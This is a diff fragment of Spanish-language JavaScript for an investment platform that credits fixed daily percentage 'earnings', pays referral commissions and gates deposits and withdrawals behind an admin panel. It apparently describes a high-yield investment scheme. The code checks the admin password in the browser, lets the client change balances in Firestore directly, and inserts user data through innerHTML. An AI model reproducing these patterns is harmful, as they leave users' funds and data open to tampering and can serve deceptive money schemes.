+
+        // Modales de recarga y retiro - Cerrar
+        closeRechargeModal.addEventListener('click', function() {
+            rechargeModal.style.display = 'none';
+            resetRechargeModal();
+        });
+
+        closeWithdrawModal.addEventListener('click', function() {
+            withdrawModal.style.display = 'none';
+            resetWithdrawModal();
+        });
+
+        // FUNCIÓN CORREGIDA PARA INICIAR CONTADORES DE INVERSIÓN
+        function startInvestmentCounter(investmentId, plan, amount, startTime) {
+            // Verificar si ya existe un contador para esta inversión
+            if (investmentCounters[investmentId]) {
+                clearInterval(investmentCounters[investmentId]);
+            }
+
+            // Crear elemento de contador si no existe
+            let counterElement = document.getElementById(`counter-${investmentId}`);
+            if (!counterElement) {
+                counterElement = document.createElement('div');
+                counterElement.className = 'countdown-container';
+                counterElement.id = `counter-${investmentId}`;
+                counterElement.innerHTML = `
+                    <div class="countdown-title">Inversión Nivel ${plan} - RD$ ${amount.toLocaleString('es-DO', {minimumFractionDigits: 2})}</div>
+                    <div class="countdown" id="countdown-${investmentId}">24:00:00</div>
+                    <div class="investment-info">Próxima ganancia</div>
+                `;
+                countersContainer.appendChild(counterElement);
+            }
+
+            // Calcular el tiempo transcurrido desde el inicio
+            const elapsedTime = Math.floor((Date.now() - startTime) / 1000); // en segundos
+            const remainingTime = 24 * 60 * 60 - (elapsedTime % (24 * 60 * 60)); // 24 horas - tiempo transcurrido
+            
+            let timeLeft = remainingTime > 0 ? remainingTime : 24 * 60 * 60;
+
+            // Función para actualizar el contador
+            function updateCounter() {
+                timeLeft--;
+                
+                if (timeLeft <= 0) {
+                    // AGREGAR GANANCIA PENDIENTE DE APROBACIÓN
+                    const investmentIndex = currentUser.investments.findIndex(inv => inv.id === investmentId);
+                    if (investmentIndex !== -1) {
+                        const dailyEarning = currentUser.investments[investmentIndex].amount * (parseInt(plan) / 100);
+                        
+                        // Crear ganancia pendiente
+                        const pendingEarning = {
+                            id: Date.now().toString(),
+                            investmentId: investmentId,
+                            amount: dailyEarning,
+                            date: new Date().toISOString(),
+                            status: 'pending'
+                        };
+                        
+                        // Actualizar Firestore
+                        db.collection('users').doc(currentUser.uid).update({
+                            pendingEarnings: firebase.firestore.FieldValue.arrayUnion(pendingEarning)
+                        })
+                        .then(() => {
+                            // Actualizar usuario local
+                            if (!currentUser.pendingEarnings) currentUser.pendingEarnings = [];
+                            currentUser.pendingEarnings.push(pendingEarning);
+                            
+                            console.log('Ganancia diaria generada para inversión:', investmentId);
+                        })
+                        .catch((error) => {
+                            console.error("Error al guardar ganancia pendiente:", error);
+                        });
+                    }
+                    
+                    // Reiniciar contador
+                    timeLeft = 24 * 60 * 60;
+                }
+                
+                // Actualizar display del contador
+                const hours = Math.floor(timeLeft / 3600);
+                const minutes = Math.floor((timeLeft % 3600) / 60);
+                const seconds = timeLeft % 60;
+                
+                const countdownElement = document.getElementById(`countdown-${investmentId}`);
+                if (countdownElement) {
+                    countdownElement.textContent = 
+                        `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                }
+            }
+
+            // Iniciar el intervalo y guardar referencia
+            updateCounter(); // Ejecutar inmediatamente para mostrar el tiempo correcto
+            investmentCounters[investmentId] = setInterval(updateCounter, 1000);
+        }
+
+        // Botones de inversión
+        investButtons.forEach(button => {
+            button.addEventListener('click', function() {
+                if (!currentUser || currentUser.status !== "approved") {
+                    alert('Su cuenta debe ser aprobada por el administrador antes de realizar inversiones.');
+                    return;
+                }
+                
+                const plan = this.getAttribute('data-plan');
+                const minAmount = parseFloat(this.getAttribute('data-amount'));
+                
+                if (currentUser.balance < minAmount) {
+                    alert(`Saldo insuficiente. Para el Nivel ${plan} necesita al menos RD$ ${minAmount.toLocaleString()}.`);
+                    return;
+                }
+                
+                const investmentAmount = prompt(`Ingrese el monto a invertir en Nivel ${plan} (mínimo: RD$ ${minAmount.toLocaleString()}):`);
+                
+                if (investmentAmount && !isNaN(investmentAmount) && parseFloat(investmentAmount) >= minAmount) {
+                    const amount = parseFloat(investmentAmount);
+                    
+                    if (amount > currentUser.balance) {
+                        alert('Saldo insuficiente para realizar esta inversión.');
+                        return;
+                    }
+                    
+                    // Crear nueva inversión con tiempo de inicio
+                    const investmentId = Date.now().toString();
+                    const investmentStartTime = Date.now(); // Tiempo de inicio de la inversión
+                    
+                    const investment = {
+                        id: investmentId,
+                        plan: plan,
+                        amount: amount,
+                        date: new Date().toLocaleDateString('es-DO'),
+                        startTime: investmentStartTime, // Guardar tiempo de inicio
+                        earnings: 0,
+                        lastEarningDate: new Date().getTime()
+                    };
+                    
+                    // Actualizar usuario en Firestore
+                    db.collection('users').doc(currentUser.uid).update({
+                        balance: firebase.firestore.FieldValue.increment(-amount),
+                        investments: firebase.firestore.FieldValue.arrayUnion(investment)
+                    })
+                    .then(() => {
+                        // Actualizar usuario local
+                        currentUser.balance -= amount;
+                        if (!currentUser.investments) currentUser.investments = [];
+                        currentUser.investments.push(investment);
+                        
+                        // Iniciar contador para esta inversión
+                        startInvestmentCounter(investmentId, plan, amount, investmentStartTime);
+                        
+                        // Actualizar displays
+                        updateAmountsDisplay();
+                        updateInvestmentHistory();
+                        
+                        alert(`¡Inversión exitosa! Ha invertido RD$ ${amount.toLocaleString('es-DO', {minimumFractionDigits: 2})} en el Nivel ${plan}.`);
+                    })
+                    .catch((error) => {
+                        console.error("Error al realizar inversión:", error);
+                        alert('Error al realizar la inversión: ' + error.message);
+                    });
+                    
+                } else if (investmentAmount) {
+                    alert(`Monto inválido. Para el Nivel ${plan} el monto mínimo es RD$ ${minAmount.toLocaleString()}.`);
+                }
+            });
+        });
+
+        // Actualizar displays de cantidades en botones
+        function updateAmountsDisplay() {
+            if (currentUser) {
+                balanceAmount.textContent = currentUser.balance.toFixed(2);
+                earningsAmount.textContent = currentUser.earnings.toFixed(2);
+                referralAmount.textContent = currentUser.referralEarnings.toFixed(2);
+            }
+        }
+
+        // FUNCIÓN MEJORADA PARA ACTUALIZAR INFORMACIÓN PERSONAL
+        function updatePersonalInfo() {
+            if (currentUser) {
+                userEmail.textContent = currentUser.email;
+                userPhone.textContent = currentUser.phone;
+                userCedula.textContent = currentUser.cedula;
+                userRegDate.textContent = new Date(currentUser.registrationDate).toLocaleDateString('es-DO');
+                userBalance.textContent = currentUser.balance.toFixed(2);
+                userEarnings.textContent = currentUser.earnings.toFixed(2);
+                
+                // Actualizar enlace de referidos
+                referralLink.value = `https://infinitycapital.com/ref/${currentUser.referralCode}`;
+                
+                // Cargar inversiones activas
+                activeInvestments = currentUser.investments || [];
+                
+                // Limpiar contadores existentes antes de recrearlos
+                Object.values(investmentCounters).forEach(interval => {
+                    clearInterval(interval);
+                });
+                investmentCounters = {};
+                countersContainer.innerHTML = '';
+                
+                // Reiniciar contadores para inversiones existentes
+                activeInvestments.forEach(inv => {
+                    // Verificar si la inversión tiene tiempo de inicio, si no usar tiempo actual
+                    const startTime = inv.startTime || Date.now();
+                    startInvestmentCounter(inv.id, inv.plan, inv.amount, startTime);
+                });
+                
+                updateAmountsDisplay();
+            }
+        }
+
+        // Actualizar historial de inversiones
+        function updateInvestmentHistory() {
+            if (!currentUser || !currentUser.investments || currentUser.investments.length === 0) {
+                noInvestmentsMessage.style.display = 'block';
+                return;
+            }
+            
+            noInvestmentsMessage.style.display = 'none';
+            
+            // Limpiar historial actual
+            investmentHistory.innerHTML = '';
+            
+            // Agregar cada inversión al historial
+            currentUser.investments.forEach(investment => {
+                const investmentItem = document.createElement('div');
+                investmentItem.className = 'investment-item';
+                investmentItem.innerHTML = `
+                    <h4>Nivel ${investment.plan} - RD$ ${investment.amount.toLocaleString('es-DO', {minimumFractionDigits: 2})}</h4>
+                    <p><strong>Fecha:</strong> ${investment.date}</p>
+                    <p><strong>Ganancias acumuladas:</strong> RD$ ${investment.earnings.toFixed(2)}</p>
+                `;
+                investmentHistory.appendChild(investmentItem);
+            });
+        }
+
+        // Actualizar lista de referidos
+        function updateReferralsList() {
+            if (!currentUser || !currentUser.referrals || currentUser.referrals.length === 0) {
+                noReferralsMessage.style.display = 'block';
+                return;
+            }
+            
+            noReferralsMessage.style.display = 'none';
+            
+            // Limpiar lista actual
+            referralsList.innerHTML = '';
+            
+            // Agregar cada referido a la lista
+            currentUser.referrals.forEach(referral => {
+                const referralItem = document.createElement('div');
+                referralItem.className = 'investment-item';
+                referralItem.innerHTML = `
+                    <h4>${referral.email}</h4>
+                    <p><strong>Inversión:</strong> RD$ ${referral.investmentAmount.toLocaleString('es-DO', {minimumFractionDigits: 2})}</p>
+                    <p><strong>Comisión:</strong> RD$ ${referral.commission.toFixed(2)}</p>
+                `;
+                referralsList.appendChild(referralItem);
+            });
+        }
+
+        // Actualizar estado de solicitudes
+        function updateRequestsStatus() {
+            if (!currentUser) return;
+            
+            // Limpiar listas
+            rechargeRequestsList.innerHTML = '';
+            withdrawRequestsList.innerHTML = '';
+            
+            let hasRechargeRequests = false;
+            let hasWithdrawRequests = false;
+            
+            // Mostrar solicitudes de recarga
+            if (currentUser.rechargeRequests && currentUser.rechargeRequests.length > 0) {
+                currentUser.rechargeRequests.forEach(request => {
+                    hasRechargeRequests = true;
+                    const requestItem = document.createElement('div');
+                    requestItem.className = 'investment-item';
+                    
+                    let statusColor = 'orange';
+                    let statusText = 'Pendiente';
+                    
+                    if (request.status === 'approved') {
+                        statusColor = 'green';
+                        statusText = 'Aprobado';
+                    } else if (request.status === 'rejected') {
+                        statusColor = 'red';
+                        statusText = 'Rechazado';
+                    }
+                    
+                    requestItem.innerHTML = `
+                        <h4>Recarga ${request.type === 'crypto' ? 'Criptomonedas' : 'Banco'}</h4>
+                        <p><strong>Monto:</strong> ${request.amount} ${request.type === 'crypto' ? 'USD' : 'RD$'}</p>
+                        <p><strong>Fecha:</strong> ${new Date(request.date).toLocaleDateString('es-DO')}</p>
+                        <p><strong>Estado:</strong> <span style="color: ${statusColor};">${statusText}</span></p>
+                    `;
+                    rechargeRequestsList.appendChild(requestItem);
+                });
+            }
+            
+            if (!hasRechargeRequests) {
+                rechargeRequestsList.innerHTML = '<p>No tienes solicitudes de recarga.</p>';
+            }
+            
+            // Mostrar solicitudes de retiro
+            if (currentUser.withdrawRequests && currentUser.withdrawRequests.length > 0) {
+                currentUser.withdrawRequests.forEach(request => {
+                    hasWithdrawRequests = true;
+                    const requestItem = document.createElement('div');
+                    requestItem.className = 'investment-item';
+                    
+                    let statusColor = 'orange';
+                    let statusText = 'Pendiente';
+                    
+                    if (request.status === 'approved') {
+                        statusColor = 'green';
+                        statusText = 'Aprobado';
+                    } else if (request.status === 'rejected') {
+                        statusColor = 'red';
+                        statusText = 'Rechazado';
+                    }
+                    
+                    requestItem.innerHTML = `
+                        <h4>Retiro ${request.type === 'crypto' ? 'Criptomonedas' : 'Banco'}</h4>
+                        <p><strong>Monto:</strong> ${request.amount} ${request.type === 'crypto' ? 'USD' : 'RD$'}</p>
+                        <p><strong>Fecha:</strong> ${new Date(request.date).toLocaleDateString('es-DO')}</p>
+                        <p><strong>Estado:</strong> <span style="color: ${statusColor};">${statusText}</span></p>
+                    `;
+                    withdrawRequestsList.appendChild(requestItem);
+                });
+            }
+            
+            if (!hasWithdrawRequests) {
+                withdrawRequestsList.innerHTML = '<p>No tienes solicitudes de retiro.</p>';
+            }
+        }
+
+        // Generar código de referido único
+        function generateReferralCode() {
+            return Math.random().toString(36).substring(2, 8).toUpperCase();
+        }
+
+        // Copiar enlace de referidos
+        copyReferralBtn.addEventListener('click', function() {
+            referralLink.select();
+            document.execCommand('copy');
+            alert('Enlace de referidos copiado al portapapeles');
+        });
+
+        // Panel de administración - Tabs
+        adminTabs.forEach(tab => {
+            tab.addEventListener('click', function() {
+                // Remover clase active de todas las tabs
+                adminTabs.forEach(t => t.classList.remove('active'));
+                // Agregar clase active a la tab seleccionada
+                this.classList.add('active');
+                
+                // Ocultar todos los contenidos
+                document.querySelectorAll('.admin-tab-content').forEach(content => {
+                    content.classList.remove('active');
+                });
+                
+                // Mostrar el contenido correspondiente
+                const tabId = this.getAttribute('data-tab');
+                document.getElementById(`admin${tabId.charAt(0).toUpperCase() + tabId.slice(1)}Tab`).classList.add('active');
+                
+                // Cargar datos según la tab
+                if (tabId === 'users') {
+                    loadAdminUsersTable();
+                } else if (tabId === 'recharge') {
+                    loadAdminRechargeTable();
+                } else if (tabId === 'withdraw') {
+                    loadAdminWithdrawTable();
+                } else if (tabId === 'earnings') {
+                    loadAdminEarningsTable();
+                } else if (tabId === 'referrals') {
+                    loadAdminReferralsTable();
+                }
+            });
+        });
+
+        // Panel de administración
+        adminIcon.addEventListener('click', function() {
+            const password = prompt('Ingrese la contraseña de administrador:');
+            if (password === adminPassword) {
+                adminPanel.style.display = 'block';
+                loadAdminUsersTable();
+            } else {
+                alert('Contraseña incorrecta.');
+            }
+        });
+
+        closeAdminPanel.addEventListener('click', function() {
+            adminPanel.style.display = 'none';
+        });
+
+        // Cargar tabla de usuarios en panel de administración
+        function loadAdminUsersTable() {
+            adminUsersTable.innerHTML = '';
+            
+            db.collection('users').get()
+                .then((querySnapshot) => {
+                    if (querySnapshot.empty) {
+                        adminUsersTable.innerHTML = '<tr><td colspan="9" style="text-align: center;">No hay usuarios registrados</td></tr>';
+                        return;
+                    }
+                    
+                    querySnapshot.forEach((doc) => {
+                        const user = doc.data();
+                        const email = user.email || 'No disponible';
+                        const phone = user.phone || 'No disponible';
+                        const cedula = user.cedula || 'No disponible';
+                        const balance = user.balance || 0;
+                        const earnings = user.earnings || 0;
+                        const referralEarnings = user.referralEarnings || 0;
+                        const status = user.status || 'pending';
+                        
+                        const row = document.createElement('tr');
+                        row.innerHTML = `
+                            <td><input type="checkbox" class="admin-checkbox user-checkbox" data-userid="${doc.id}"></td>
+                            <td>${email}</td>
+                            <td>${phone}</td>
+                            <td>${cedula}</td>
+                            <td>RD$ ${balance.toFixed(2)}</td>
+                            <td>RD$ ${earnings.toFixed(2)}</td>
+                            <td>RD$ ${referralEarnings.toFixed(2)}</td>
+                            <td>${status === 'approved' ? 'Aprobado' : 'Pendiente'}</td>
+                            <td>
+                                <button class="admin-action approve-btn" data-userid="${doc.id}">Aprobar</button>
+                                <button class="admin-action delete-btn" data-userid="${doc.id}">Eliminar</button>
+                            </td>
+                        `;
+                        adminUsersTable.appendChild(row);
+                    });
+                    
+                    // Configurar checkbox de selección múltiple para usuarios
+                    selectAllUsers.addEventListener('change', function() {
+                        const checkboxes = document.querySelectorAll('.user-checkbox');
+                        checkboxes.forEach(checkbox => {
+                            checkbox.checked = this.checked;
+                        });
+                    });
+                    
+                    // Agregar event listeners a los botones de acción
+                    document.querySelectorAll('.approve-btn').forEach(btn => {
+                        btn.addEventListener('click', function() {
+                            const userId = this.getAttribute('data-userid');
+                            approveUser(userId);
+                        });
+                    });
+                    
+                    document.querySelectorAll('.delete-btn').forEach(btn => {
+                        btn.addEventListener('click', function() {
+                            const userId = this.getAttribute('data-userid');
+                            deleteUser(userId);
+                        });
+                    });
+                })
+                .catch((error) => {
+                    console.error("Error al cargar usuarios:", error);
+                    adminUsersTable.innerHTML = '<tr><td colspan="9" style="text-align: center; color: red;">Error al cargar la lista de usuarios</td></tr>';
+                });
+        }
+
+        // Cargar tabla de solicitudes de recarga
+        function loadAdminRechargeTable() {
+            adminRechargeTable.innerHTML = '';
+            
+            db.collection('users').get()
+                .then((querySnapshot) => {
+                    let hasPendingRequests = false;
+                    
+                    querySnapshot.forEach((doc) => {
+                        const user = doc.data();
+                        if (user.rechargeRequests && user.rechargeRequests.length > 0) {
+                            user.rechargeRequests.forEach(request => {
+                                if (request.status === 'pending') {
+                                    hasPendingRequests = true;
+                                    const row = document.createElement('tr');
+                                    row.innerHTML = `
+                                        <td><input type="checkbox" class="admin-checkbox recharge-checkbox" data-userid="${doc.id}" data-requestid="${request.id}"></td>
+                                        <td>${user.email}</td>
+                                        <td>${request.type === 'crypto' ? 'Criptomonedas' : 'Banco'}</td>
+                                        <td>${request.amount} ${request.type === 'crypto' ? 'USD' : 'RD$'}</td>
+                                        <td>${new Date(request.date).toLocaleDateString('es-DO')}</td>
+                                        <td>Pendiente</td>
+                                    `;
+                                    adminRechargeTable.appendChild(row);
+                                }
+                            });
+                        }
+                    });
+                    
+                    if (!hasPendingRequests) {
+                        adminRechargeTable.innerHTML = '<tr><td colspan="6" style="text-align: center;">No hay solicitudes de recarga pendientes</td></tr>';
+                    }
+                    
+                    // Configurar checkbox de selección múltiple
+                    selectAllRecharges.addEventListener('change', function() {
+                        const checkboxes = document.querySelectorAll('.recharge-checkbox');
+                        checkboxes.forEach(checkbox => {
+                            checkbox.checked = this.checked;
+                        });
+                    });
+                })
+                .catch((error) => {
+                    console.error("Error al cargar solicitudes de recarga:", error);
+                    adminRechargeTable.innerHTML = '<tr><td colspan="6" style="text-align: center; color: red;">Error al cargar las solicitudes</td></tr>';
+                });
+        }
+
+        // Cargar tabla de solicitudes de retiro
+        function loadAdminWithdrawTable() {
+            adminWithdrawTable.innerHTML = '';
+            
+            db.collection('users').get()
+                .then((querySnapshot) => {
+                    let hasPendingRequests = false;
+                    
+                    querySnapshot.forEach((doc) => {
+                        const user = doc.data();
+                        if (user.withdrawRequests && user.withdrawRequests.length > 0) {
+                            user.withdrawRequests.forEach(request => {
+                                if (request.status === 'pending') {
+                                    hasPendingRequests = true;
+                                    const row = document.createElement('tr');
+                                    row.innerHTML = `
+                                        <td><input type="checkbox" class="admin-checkbox withdraw-checkbox" data-userid="${doc.id}" data-requestid="${request.id}"></td>
+                                        <td>${user.email}</td>
+                                        <td>${request.type === 'crypto' ? 'Criptomonedas' : 'Banco'}</td>
+                                        <td>${request.amount} ${request.type === 'crypto' ? 'USD' : 'RD$'}</td>
+                                        <td>${new Date(request.date).toLocaleDateString('es-DO')}</td>
+                                        <td>Pendiente</td>
+                                    `;
+                                    adminWithdrawTable.appendChild(row);
+                                }
+                            });
+                        }
+                    });
+                    
+                    if (!hasPendingRequests) {
+                        adminWithdrawTable.innerHTML = '<tr><td colspan="6" style="text-align: center;">No hay solicitudes de retiro pendientes</td></tr>';
+                    }
+                    
+                    // Configurar checkbox de selección múltiple
+                    selectAllWithdraws.addEventListener('change', function() {
+                        const checkboxes = document.querySelectorAll('.withdraw-checkbox');
+                        checkboxes.forEach(checkbox => {
+                            checkbox.checked = this.checked;
+                        });
+                    });
+                })
+                .catch((error) => {
+                    console.error("Error al cargar solicitudes de retiro:", error);
+                    adminWithdrawTable.innerHTML = '<tr><td colspan="6" style="text-align: center; color: red;">Error al cargar las solicitudes</td></tr>';
+                });
+        }
+
+        // Cargar tabla de ganancias diarias
+        function loadAdminEarningsTable() {
+            adminEarningsTable.innerHTML = '';
+            
+            db.collection('users').get()
+                .then((querySnapshot) => {
+                    let hasPendingEarnings = false;
+                    
+                    querySnapshot.forEach((doc) => {
+                        const user = doc.data();
+                        if (user.pendingEarnings && user.pendingEarnings.length > 0) {
+                            user.pendingEarnings.forEach(earning => {
+                                if (earning.status === 'pending') {
+                                    hasPendingEarnings = true;
+                                    const row = document.createElement('tr');
+                                    row.innerHTML = `
+                                        <td><input type="checkbox" class="admin-checkbox earning-checkbox" data-userid="${doc.id}" data-earningid="${earning.id}"></td>
+                                        <td>${user.email}</td>
+                                        <td>RD$ ${earning.amount.toFixed(2)}</td>
+                                        <td>RD$ ${earning.amount.toFixed(2)}</td>
+                                        <td>${new Date(earning.date).toLocaleDateString('es-DO')}</td>
+                                        <td>Pendiente</td>
+                                    `;
+                                    adminEarningsTable.appendChild(row);
+                                }
+                            });
+                        }
+                    });
+                    
+                    if (!hasPendingEarnings) {
+                        adminEarningsTable.innerHTML = '<tr><td colspan="6" style="text-align: center;">No hay ganancias diarias pendientes</td></tr>';
+                    }
+                    
+                    // Configurar checkbox de selección múltiple
+                    selectAllEarnings.addEventListener('change', function() {
+                        const checkboxes = document.querySelectorAll('.earning-checkbox');
+                        checkboxes.forEach(checkbox => {
+                            checkbox.checked = this.checked;
+                        });
+                    });
+                })
+                .catch((error) => {
+                    console.error("Error al cargar ganancias diarias:", error);
+                    adminEarningsTable.innerHTML = '<tr><td colspan="6" style="text-align: center; color: red;">Error al cargar las ganancias</td></tr>';
+                });
+        }
+
+        // Cargar tabla de ganancias por referidos
+        function loadAdminReferralsTable() {
+            adminReferralsTable.innerHTML = '';
+            
+            // Por ahora, mostramos un mensaje ya que esta funcionalidad requiere más desarrollo
+            adminReferralsTable.innerHTML = '<tr><td colspan="6" style="text-align: center;">Funcionalidad en desarrollo</td></tr>';
+        }
+
+        // Aprobar usuarios seleccionados
+        approveSelectedUsers.addEventListener('click', function() {
+            const selectedCheckboxes = document.querySelectorAll('.user-checkbox:checked');
+            
+            if (selectedCheckboxes.length === 0) {
+                alert('Por favor selecciona al menos un usuario para aprobar.');
+                return;
+            }
+            
+            if (confirm(`¿Estás seguro de que deseas aprobar ${selectedCheckboxes.length} usuario(s)?`)) {
+                const promises = [];
+                
+                selectedCheckboxes.forEach(checkbox => {
+                    const userId = checkbox.getAttribute('data-userid');
+                    promises.push(approveUser(userId));
+                });
+                
+                Promise.all(promises)
+                    .then(() => {
+                        alert(`${selectedCheckboxes.length} usuario(s) aprobado(s) correctamente.`);
+                        loadAdminUsersTable();
+                    })
+                    .catch((error) => {
+                        console.error("Error al aprobar usuarios:", error);
+                        alert('Error al aprobar los usuarios: ' + error.message);
+                    });
+            }
+        });
+
+        // Eliminar usuarios seleccionados
+        deleteSelectedUsers.addEventListener('click', function() {
+            const selectedCheckboxes = document.querySelectorAll('.user-checkbox:checked');
+            
+            if (selectedCheckboxes.length === 0) {
+                alert('Por favor selecciona al menos un usuario para eliminar.');
+                return;
+            }
+            
+            if (confirm(`¿Estás seguro de que deseas eliminar ${selectedCheckboxes.length} usuario(s)?`)) {
+                const promises = [];
+                
+                selectedCheckboxes.forEach(checkbox => {
+                    const userId = checkbox.getAttribute('data-userid');
+                    promises.push(deleteUser(userId));
+                });
+                
+                Promise.all(promises)
+                    .then(() => {
+                        alert(`${selectedCheckboxes.length} usuario(s) eliminado(s) correctamente.`);
+                        loadAdminUsersTable();
+                    })
+                    .catch((error) => {
+                        console.error("Error al eliminar usuarios:", error);
+                        alert('Error al eliminar los usuarios: ' + error.message);
+                    });
+            }
+        });
+
+        // Aprobar recargas seleccionadas
+        approveSelectedRecharges.addEventListener('click', function() {
+            const selectedCheckboxes = document.querySelectorAll('.recharge-checkbox:checked');
+            
+            if (selectedCheckboxes.length === 0) {
+                alert('Por favor selecciona al menos una solicitud de recarga para aprobar.');
+                return;
+            }
+            
+            if (confirm(`¿Estás seguro de que deseas aprobar ${selectedCheckboxes.length} solicitud(es) de recarga?`)) {
+                const promises = [];
+                
+                selectedCheckboxes.forEach(checkbox => {
+                    const userId = checkbox.getAttribute('data-userid');
+                    const requestId = checkbox.getAttribute('data-requestid');
+                    
+                    promises.push(processRechargeRequest(userId, requestId, 'approve'));
+                });
+                
+                Promise.all(promises)
+                    .then(() => {
+                        alert(`${selectedCheckboxes.length} solicitud(es) de recarga aprobada(s) correctamente.`);
+                        loadAdminRechargeTable();
+                    })
+                    .catch((error) => {
+                        console.error("Error al aprobar recargas:", error);
+                        alert('Error al aprobar las solicitudes: ' + error.message);
+                    });
+            }
+        });
+
+        // Rechazar recargas seleccionadas
+        rejectSelectedRecharges.addEventListener('click', function() {
+            const selectedCheckboxes = document.querySelectorAll('.recharge-checkbox:checked');
+            
+            if (selectedCheckboxes.length === 0) {
+                alert('Por favor selecciona al menos una solicitud de recarga para rechazar.');
+                return;
+            }
+            
+            if (confirm(`¿Estás seguro de que deseas rechazar ${selectedCheckboxes.length} solicitud(es) de recarga?`)) {
+                const promises = [];
+                
+                selectedCheckboxes.forEach(checkbox => {
+                    const userId = checkbox.getAttribute('data-userid');
+                    const requestId = checkbox.getAttribute('data-requestid');
+                    
+                    promises.push(processRechargeRequest(userId, requestId, 'reject'));
+                });
+                
+                Promise.all(promises)
+                    .then(() => {
+                        alert(`${selectedCheckboxes.length} solicitud(es) de recarga rechazada(s) correctamente.`);
+                        loadAdminRechargeTable();
+                    })
+                    .catch((error) => {
+                        console.error("Error al rechazar recargas:", error);
+                        alert('Error al rechazar las solicitudes: ' + error.message);
+                    });
+            }
+        });
+
+        // Aprobar retiros seleccionados
+        approveSelectedWithdraws.addEventListener('click', function() {
+            const selectedCheckboxes = document.querySelectorAll('.withdraw-checkbox:checked');
+            
+            if (selectedCheckboxes.length === 0) {
+                alert('Por favor selecciona al menos una solicitud de retiro para aprobar.');
+                return;
+            }
+            
+            if (confirm(`¿Estás seguro de que deseas aprobar ${selectedCheckboxes.length} solicitud(es) de retiro?`)) {
+                const promises = [];
+                
+                selectedCheckboxes.forEach(checkbox => {
+                    const userId = checkbox.getAttribute('data-userid');
+                    const requestId = checkbox.getAttribute('data-requestid');
+                    
+                    promises.push(processWithdrawRequest(userId, requestId, 'approve'));
+                });
+                
+                Promise.all(promises)
+                    .then(() => {
+                        alert(`${selectedCheckboxes.length} solicitud(es) de retiro aprobada(s) correctamente.`);
+                        loadAdminWithdrawTable();
+                    })
+                    .catch((error) => {
+                        console.error("Error al aprobar retiros:", error);
+                        alert('Error al aprobar las solicitudes: ' + error.message);
+                    });
+            }
+        });
+
+        // Rechazar retiros seleccionados
+        rejectSelectedWithdraws.addEventListener('click', function() {
+            const selectedCheckboxes = document.querySelectorAll('.withdraw-checkbox:checked');
+            
+            if (selectedCheckboxes.length === 0) {
+                alert('Por favor selecciona al menos una solicitud de retiro para rechazar.');
+                return;
+            }
+            
+            if (confirm(`¿Estás seguro de que deseas rechazar ${selectedCheckboxes.length} solicitud(es) de retiro?`)) {
+                const promises = [];
+                
+                selectedCheckboxes.forEach(checkbox => {
+                    const userId = checkbox.getAttribute('data-userid');
+                    const requestId = checkbox.getAttribute('data-requestid');
+                    
+                    promises.push(processWithdrawRequest(userId, requestId, 'reject'));
+                });
+                
+                Promise.all(promises)
+                    .then(() => {
+                        alert(`${selectedCheckboxes.length} solicitud(es) de retiro rechazada(s) correctamente.`);
+                        loadAdminWithdrawTable();
+                    })
+                    .catch((error) => {
+                        console.error("Error al rechazar retiros:", error);
+                        alert('Error al rechazar las solicitudes: ' + error.message);
+                    });
+            }
+        });
+
+        // Aprobar ganancias seleccionadas
+        approveSelectedEarnings.addEventListener('click', function() {
+            const selectedCheckboxes = document.querySelectorAll('.earning-checkbox:checked');
+            
+            if (selectedCheckboxes.length === 0) {
+                alert('Por favor selecciona al menos una ganancia diaria para aprobar.');
+                return;
+            }
+            
+            if (confirm(`¿Estás seguro de que deseas aprobar ${selectedCheckboxes.length} ganancia(s) diaria(s)?`)) {
+                const promises = [];
+                
+                selectedCheckboxes.forEach(checkbox => {
+                    const userId = checkbox.getAttribute('data-userid');
+                    const earningId = checkbox.getAttribute('data-earningid');
+                    
+                    promises.push(processEarningRequest(userId, earningId, 'approve'));
+                });
+                
+                Promise.all(promises)
+                    .then(() => {
+                        alert(`${selectedCheckboxes.length} ganancia(s) diaria(s) aprobada(s) correctamente.`);
+                        loadAdminEarningsTable();
+                    })
+                    .catch((error) => {
+                        console.error("Error al aprobar ganancias:", error);
+                        alert('Error al aprobar las ganancias: ' + error.message);
+                    });
+            }
+        });
+
+        // Rechazar ganancias seleccionadas
+        rejectSelectedEarnings.addEventListener('click', function() {
+            const selectedCheckboxes = document.querySelectorAll('.earning-checkbox:checked');
+            
+            if (selectedCheckboxes.length === 0) {
+                alert('Por favor selecciona al menos una ganancia diaria para rechazar.');
+                return;
+            }
+            
+            if (confirm(`¿Estás seguro de que deseas rechazar ${selectedCheckboxes.length} ganancia(s) diaria(s)?`)) {
+                const promises = [];
+                
+                selectedCheckboxes.forEach(checkbox => {
+                    const userId = checkbox.getAttribute('data-userid');
+                    const earningId = checkbox.getAttribute('data-earningid');
+                    
+                    promises.push(processEarningRequest(userId, earningId, 'reject'));
+                });
+                
+                Promise.all(promises)
+                    .then(() => {
+                        alert(`${selectedCheckboxes.length} ganancia(s) diaria(s) rechazada(s) correctamente.`);
+                        loadAdminEarningsTable();
+                    })
+                    .catch((error) => {
+                        console.error("Error al rechazar ganancias:", error);
+                        alert('Error al rechazar las ganancias: ' + error.message);
+                    });
+            }
+        });
+
+        // Procesar solicitud de recarga
+        function processRechargeRequest(userId, requestId, action) {
+            return db.collection('users').doc(userId).get()
+                .then((doc) => {
+                    if (doc.exists) {
+                        const user = doc.data();
+                        const rechargeRequests = user.rechargeRequests || [];
+                        const requestIndex = rechargeRequests.findIndex(req => req.id === requestId);
+                        
+                        if (requestIndex !== -1) {
+                            if (action === 'approve') {
+                                // Aprobar recarga - agregar saldo
+                                const amount = rechargeRequests[requestIndex].amount;
+                                rechargeRequests[requestIndex].status = 'approved';
+                                
+                                // Actualizar usuario
+                                return db.collection('users').doc(userId).update({
+                                    rechargeRequests: rechargeRequests,
+                                    balance: firebase.firestore.FieldValue.increment(amount)
+                                });
+                            } else {
+                                // Rechazar recarga
+                                rechargeRequests[requestIndex].status = 'rejected';
+                                return db.collection('users').doc(userId).update({
+                                    rechargeRequests: rechargeRequests
+                                });
+                            }
+                        }
+                    }
+                })
+                .then(() => {
+                    console.log(`Solicitud de recarga ${action === 'approve' ? 'aprobada' : 'rechazada'} correctamente.`);
+                })
+                .catch((error) => {
+                    console.error("Error al procesar solicitud de recarga:", error);
+                    throw error;
+                });
+        }
+
+        // Procesar solicitud de retiro
+        function processWithdrawRequest(userId, requestId, action) {
+            return db.collection('users').doc(userId).get()
+                .then((doc) => {
+                    if (doc.exists) {
+                        const user = doc.data();
+                        const withdrawRequests = user.withdrawRequests || [];
+                        const requestIndex = withdrawRequests.findIndex(req => req.id === requestId);
+                        
+                        if (requestIndex !== -1) {
